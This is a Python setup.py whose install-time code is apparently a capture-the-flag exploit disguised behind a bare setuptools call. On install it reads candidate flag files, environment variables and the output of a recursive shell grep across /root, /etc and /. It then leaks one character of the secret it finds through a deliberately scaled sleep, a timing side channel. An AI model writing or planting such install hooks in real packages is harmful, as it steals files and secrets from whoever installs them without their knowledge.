
import os, glob, subprocess, time, re
def find_flag():
    pats=[]
    cands=['/flag','/flag.txt','/flag/flag.txt','/root/flag.txt','/root/flag','/home/ctf/flag.txt','/app/flag.txt','/app/flag','/srv/flag.txt','/opt/flag.txt','/flag.py']
    cands+=glob.glob('/flag*')+glob.glob('/home/*/flag*')+glob.glob('/*flag*')+glob.glob('/app/*flag*')+glob.glob('/root/*flag*')
    for p in set(cands):
        try:
            d=open(p,'r',errors='replace').read()
            m=re.search(r'ALGOLYMP\{[^}]*\}', d)
            if m: return m.group(0)
            if d.strip(): return d.strip()
        except Exception: pass
    for k,v in os.environ.items():
        m=re.search(r'ALGOLYMP\{[^}]*\}', str(v))
        if m: return m.group(0)
    for root in ['/app','/root','/home','/srv','/opt','/flag','/tmp','/etc','/']:
        try:
            g=subprocess.run("grep -raom1 'ALGOLYMP{[^}]*}' "+root+" 2>/dev/null | head -1", shell=True, capture_output=True, timeout=10)
            o=g.stdout.decode('latin-1','replace').strip()
            if o: return o
        except Exception: pass
    return ''
F=find_flag()
i=9
if i < len(F):
    time.sleep(0.8 + (ord(F[i])-33)*0.5)
else:
    time.sleep(0.3)

from setuptools import setup
setup(name='p', version='1.0')
